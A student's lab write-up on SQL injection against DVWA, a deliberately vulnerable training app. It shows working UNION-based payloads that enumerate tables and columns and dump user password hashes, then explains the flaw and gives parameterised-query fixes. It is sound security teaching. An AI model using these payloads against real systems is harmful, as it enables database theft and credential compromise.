# Task 9: Advanced SQL Injection on DVWA

**Internship:** OIBSIP – Security Analyst Internship
**Task Level:** Advanced
**Author:** [Your Name]
**Student ID:** x24334715

## Objective
Extend Task 3's basic SQL injection into a comprehensive exploitation exercise — enumerating database tables, extracting schema information, dumping credentials, and producing a detailed vulnerability report with developer-facing remediation.

## Tools Used
- DVWA (Damn Vulnerable Web Application) via Docker
- Browser (manual injection)
- Linux terminal

## Setup
```bash
docker start dvwa
```
Visit http://localhost → login admin/password → Security set to Low

## Exploitation — Step by Step

### Step 1: Confirm Injection Point
```sql
1' OR '1'='1
```
Returned all 5 users — confirmed injectable parameter.

### Step 2: Enumerate Database Tables
```sql
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()-- -
```
**Result:**
- `guestbook`
- `users`

### Step 3: Extract Column Names
```sql
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'-- -
```
**Result:** `user_id`, `first_name`, `last_name`, `user`, `password`, `avatar`, `last_login`, `failed_login`

### Step 4: Dump Credentials
```sql
1' UNION SELECT user, password FROM users-- -
```
**Result:**

| Username | Password Hash | Hash Type |
|----------|--------------|-----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 |
| gordonb | e99a18c428cb38d5f260853678922e03 | MD5 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b | MD5 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 | MD5 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 | MD5 |

**Critical finding:** `5f4dcc3b5aa765d61d8327deb882cf99` is the MD5 hash of `password` — trivially crackable using any online hash lookup tool, demonstrating that SQLi combined with weak password hashing leads to immediate full credential compromise.

## Executive Summary (Non-Technical)
A critical SQL Injection vulnerability was identified in the DVWA web application. An attacker with no special access was able to extract the complete contents of the user database, including all usernames and password hashes, by entering specially crafted text into a standard input field. The password hashes were stored using an outdated algorithm (MD5) and were immediately reversible. This means an attacker could gain administrative access to the application within minutes of discovering this vulnerability. Immediate remediation is required.

## Why This Vulnerability Exists
The application builds SQL queries by directly concatenating user input:
```php
// Vulnerable code
$query = "SELECT * FROM users WHERE user_id = '$id';";
```
When a user enters `1' UNION SELECT user, password FROM users-- -`, the query becomes:
```sql
SELECT * FROM users WHERE user_id = '1' UNION SELECT user, password FROM users-- -';
```
The database executes both queries and returns the combined result.

## Remediation — Parameterised Queries

### PHP Fix
```php
// Secure code using prepared statements
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

### Python Fix
```python
# Secure code using parameterised query
cursor.execute("SELECT first_name, last_name FROM users WHERE user_id = %s", (user_id,))
result = cursor.fetchall()
```

In both cases, the user input is passed as a parameter separate from the query structure. The database treats it as pure data, not executable SQL, making injection impossible.

## Additional Recommendations
- Replace MD5 with **bcrypt or Argon2** for password hashing
- Implement **input validation** and whitelist expected formats
- Apply **least privilege** — the app's DB user should not have access to `information_schema`
- Enable a **WAF** to detect and block common SQLi patterns
- Conduct regular **penetration testing** and code reviews

## References
- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- PortSwigger SQL Injection: https://portswigger.net/web-security/sql-injection
- OWASP Top 10 A03:2021 Injection
